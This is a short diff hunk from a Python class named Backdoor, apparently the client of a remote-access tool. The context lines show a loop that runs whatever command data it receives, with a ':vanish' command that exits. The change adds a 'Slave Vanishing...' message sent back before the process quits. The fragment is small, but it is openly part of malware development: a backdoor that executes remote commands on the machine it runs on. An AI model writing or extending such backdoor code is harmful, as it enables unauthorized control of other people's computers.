@@ -80,6 +80,8 @@ class Backdoor(object):
             if data == '':
                 continue
             elif data == ':vanish':
+                self.__msg('Slave Vanishing...')
+                self.__send()
                 os._exit(0)
             
             out = self.__execute_code(data)
